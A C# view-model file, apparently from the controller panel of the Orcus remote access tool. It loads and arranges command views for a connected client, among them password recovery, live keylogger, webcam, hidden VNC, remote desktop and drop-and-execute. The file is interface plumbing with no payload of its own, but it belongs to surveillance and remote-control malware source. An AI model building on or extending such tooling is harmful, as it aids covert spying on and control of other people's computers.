using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Reflection;
using System.Windows;
using System.Windows.Data;
using Orcus.Administration.Core;
using Orcus.Administration.Core.CommandManagement.View;
using Orcus.Administration.Core.Plugins;
using Orcus.Administration.Core.Plugins.Wrappers;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Administration.ViewModels.CommandViewModels;
using Orcus.Administration.ViewModels.Controller;
using Orcus.Administration.ViewModels.ViewInterface;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels
{
    public class ControllerViewModel : PropertyChangedBase, IDisposable
    {
        private readonly List<ICommandView> _collectionViews;
        private readonly Dictionary<ICommandView, IWindow> _commandViewWindows;
        private RelayCommand<ICommandView> _openCommandInExternalWindowCommand;
        private ICommandView _selectedCommandView;

        public ControllerViewModel(ClientController controller)
        {
            ClientController = controller;
            var crossViewManager = new CrossViewManager();
            crossViewManager.OpenCommandView += CrossViewManagerOnOpenCommandView;

            _commandViewWindows = new Dictionary<ICommandView, IWindow>();

            var tempCommandViews =
                new List<ICommandView>(
                    PluginManager.Current.LoadedPlugins.OfType<IViewPlugin>()
                        .Where(
                            x =>
                                !(x is FactoryCommandPlugin) ||
                                controller.Client.Plugins.FirstOrDefault(y => y.Guid == x.PluginInfo.Guid)?.IsLoaded ==
                                true)
                        .Select(x => (ICommandView) Activator.CreateInstance(x.CommandView)))
                {
                    new FunViewModel(),
                    new ConsoleViewModel(),
                    new CommandViewModels.PasswordsViewModel(),
                    new FileExplorerViewModel(),
                    new MessageBoxViewModel(),
                    new AudioViewModel(),
                    new CodeViewModel(),
                    new RegistryViewModel(),
                    new ActiveConnectionsViewModel(),
                    new UninstallProgramsViewModel(),
                    new ClientPluginsViewModel(),
                    new ClientConfigViewModel(),
                    new EventLogViewModel(),
                    new ReverseProxyViewModel(),
                    new WebcamViewModel(),
                    new AudioVolumeControlViewModel(),
                    new LivePerformanceViewModel(),
                    new UserInteractionViewModel(),
#if DEBUG
                    new HvncViewModel(),
#endif
                    new TextChatViewModel(),
                    new CommandViewModels.ComputerInformationViewModel(),
                    new RemoteDesktopViewModel(),
                    new LiveKeyloggerViewModel(),
                    new StartupManagerViewModel(),
                    new WindowsCustomizerViewModel(),
                    new SystemRestoreViewModel(),
                    new TaskmanagerViewModel(),
                    new WindowManagerViewModel(),
                    new DeviceManagerViewModel(),
                    new ClientCommandsViewModel(),
                    new VoiceChatViewModel(),
                    new WindowsDriversViewModel(),
                    new DropAndExecuteViewModel(),
                    new ClipboardManagerViewModel()
                };

            UnsupportedCommandViews = new List<CommandView>();
            foreach (var commandView in tempCommandViews.OfType<CommandView>().ToList())
            {
                var minimumVersionAttribute =
                    (MinimumClientVersionAttribute)
                        commandView.GetType().GetCustomAttribute(typeof (MinimumClientVersionAttribute));

                if (controller.Client.Version < minimumVersionAttribute?.MinimumClientVersion)
                {
                    tempCommandViews.Remove(commandView);
                    UnsupportedCommandViews.Add(commandView);
                }
            }

            var categoryOrder = new List<Category>
            {
                Category.Client,
                Category.Information,
                Category.Fun,
                Category.Utilities,
                Category.System,
                Category.Surveillance
            };

            _collectionViews = new List<ICommandView>(tempCommandViews.OrderBy(x => categoryOrder.IndexOf(x.Category)).ThenBy(x => x.Name));
            _collectionViews.Insert(0, new ClientControlViewModel()); //This should always be the first entry

            var currentWindow = WindowServiceInterface.Current.GetCurrentWindow();
            foreach (var commandView in _collectionViews)
            {
                commandView.WindowService = currentWindow;
                commandView.Initialize(controller, crossViewManager);
            }
            CommandViews = CollectionViewSource.GetDefaultView(_collectionViews);
            CommandViews.GroupDescriptions.Add(new PropertyGroupDescription("Category"));
            CommandViews.Filter = Filter;
            SelectedCommandView = _collectionViews[0];
        }

        private void CrossViewManagerOnOpenCommandView(object sender, ICommandView commandView)
        {
            if (_commandViewWindows.ContainsKey(commandView))
                _commandViewWindows[commandView].Activate();
            else
                OpenCommandInExternalWindowCommand.Execute(commandView);
        }

        public ClientController ClientController { get; }
        public ICollectionView CommandViews { get; }
        public List<CommandView> UnsupportedCommandViews { get; }
        public IViewManagerModelController ViewManagerModelController { get; set; }

        public ICommandView SelectedCommandView
        {
            get { return _selectedCommandView; }
            set
            {
                if (value == null || !_commandViewWindows.ContainsKey(value))
                    SetProperty(value, ref _selectedCommandView);
                else
                    SetProperty(null, ref _selectedCommandView);
            }
        }

        public RelayCommand<ICommandView> OpenCommandInExternalWindowCommand
        {
            get
            {
                return _openCommandInExternalWindowCommand ??
                       (_openCommandInExternalWindowCommand = new RelayCommand<ICommandView>(commandView =>
                       {
                           if (commandView == null)
                               return;

                           var isSelected = commandView == SelectedCommandView;

                           if (_commandViewWindows.ContainsKey(commandView))
                               _commandViewWindows[commandView].Activate();
                           else
                           {
                               var window =
                                   WindowServiceInterface.Current.OpenWindowCentered(
                                       new CommandViewModel(ViewManagerModelController.GetView(commandView), commandView),
                                       $"{commandView.Name} - {ClientController.Client.IpAddress}:{ClientController.Client.Port} ({ClientController.Client.UserName})").Value;

                               window.Closed += (sender, args) =>
                               {
                                   _commandViewWindows.Remove(commandView);
                                   commandView.WindowService = WindowServiceInterface.Current.GetCurrentWindow();
                                   CommandViews.Refresh();
                               };
                               _commandViewWindows.Add(commandView, window);
                               CommandViews.Refresh();
                               if (isSelected)
                                   SelectedCommandView =
                                       _collectionViews.FirstOrDefault(x => !_commandViewWindows.ContainsKey(x));
                               commandView.WindowService = window;
                           }
                       }));
            }
        }

        private bool Filter(object o)
        {
            var commandView = o as ICommandView;
            if (commandView == null)
                return false;

            return !_commandViewWindows.ContainsKey(commandView);
        }

        public void Dispose()
        {
            //ToList -> if the window is closed, it will fire the closed event which will remove an item -> Collection changed exception
            Application.Current.Dispatcher.Invoke(() =>
            {
                foreach (var commandViewWindow in _commandViewWindows.ToList())
                {
                    commandViewWindow.Value.Close();
                }

                _commandViewWindows.Clear();

                foreach (var commandView in _collectionViews) //must be called in an invoke delegate because else an InvalidOperationException will be thrown
                    commandView.Dispose();
            });

            ClientController.Dispose();
        }
    }

    public interface IFullscreenableWindow
    {
        bool IsFullscreen { get; set; }
        event EventHandler FullscreenChanged;
    }
}